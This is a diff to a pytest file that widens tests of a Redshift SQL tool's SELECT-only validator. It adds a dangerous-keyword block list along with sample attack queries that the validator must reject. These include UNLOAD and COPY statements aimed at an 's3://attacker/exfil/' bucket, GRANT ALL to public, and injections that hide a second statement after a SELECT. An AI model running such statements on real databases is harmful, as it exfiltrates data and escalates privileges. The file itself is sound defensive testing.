@@ -104,7 +104,10 @@ def test_sql_security_validation():
         assert sql_upper.startswith('SELECT') or sql_upper.startswith('WITH'), f"{query} should be valid"
     
     # 測試危險的 SQL 關鍵字
-    dangerous_keywords = ['DROP', 'DELETE', 'UPDATE', 'INSERT', 'ALTER', 'CREATE', 'TRUNCATE']
+    dangerous_keywords = [
+        'DROP', 'DELETE', 'UPDATE', 'INSERT', 'ALTER', 'CREATE', 'TRUNCATE',
+        'MERGE', 'GRANT', 'REVOKE', 'COPY', 'UNLOAD',
+    ]
     dangerous_queries = [
         "DROP TABLE users",
         "DELETE FROM users",
@@ -112,7 +115,12 @@ def test_sql_security_validation():
         "INSERT INTO users VALUES ('hacker', 'password')",
         "ALTER TABLE users ADD COLUMN malicious TEXT",
         "CREATE TABLE evil_table (id INT)",
-        "TRUNCATE TABLE users"
+        "TRUNCATE TABLE users",
+        "MERGE INTO users USING staging ON users.id = staging.id WHEN MATCHED THEN UPDATE SET name = staging.name",
+        "GRANT ALL ON users TO public",
+        "REVOKE SELECT ON users FROM analyst",
+        "COPY users FROM 's3://attacker/users.csv' IAM_ROLE 'arn:...'",
+        "UNLOAD ('SELECT * FROM users') TO 's3://attacker/exfil/' IAM_ROLE 'arn:...'",
     ]
     
     for query in dangerous_queries:
@@ -845,6 +853,24 @@ class TestExecuteSQL:
 
         with pytest.raises(ValueError, match="Only SELECT and WITH"):
             execute_sql(sql_statement='SHOW TABLES')
+
+    @pytest.mark.parametrize("keyword,sql", [
+        # MERGE SQL kept minimal so it doesn't contain UPDATE/DELETE/INSERT (which would
+        # match earlier in the dangerous_keywords list and mask the MERGE check).
+        ("MERGE",  "WITH src AS (SELECT 1 id) SELECT 1; MERGE INTO t USING src ON 1=1"),
+        ("GRANT",  "SELECT 1; GRANT ALL ON users TO public"),
+        ("REVOKE", "SELECT 1; REVOKE SELECT ON users FROM analyst"),
+        ("COPY",   "SELECT 1; COPY users FROM 's3://bad/' IAM_ROLE 'arn:...'"),
+        ("UNLOAD", "SELECT 1; UNLOAD ('SELECT * FROM users') TO 's3://exfil/' IAM_ROLE 'arn:...'"),
+    ])
+    def test_execute_sql_dangerous_extra_keywords(self, mock_config, keyword, sql):
+        """擋掉 v0.3.x 後新增的關鍵字（MERGE / GRANT / REVOKE / COPY / UNLOAD），
+        含 CTE 偽裝（SELECT 開頭但 DML/admin 動作藏在後段）。"""
+        config, _ = mock_config
+        tools = RedshiftTools(config)
+        execute_sql = _get_tool_fn(tools, 'execute_sql')
+        with pytest.raises(ValueError, match=keyword):
+            execute_sql(sql_statement=sql)
 
 
 # ========== 錯誤處理測試 ==========
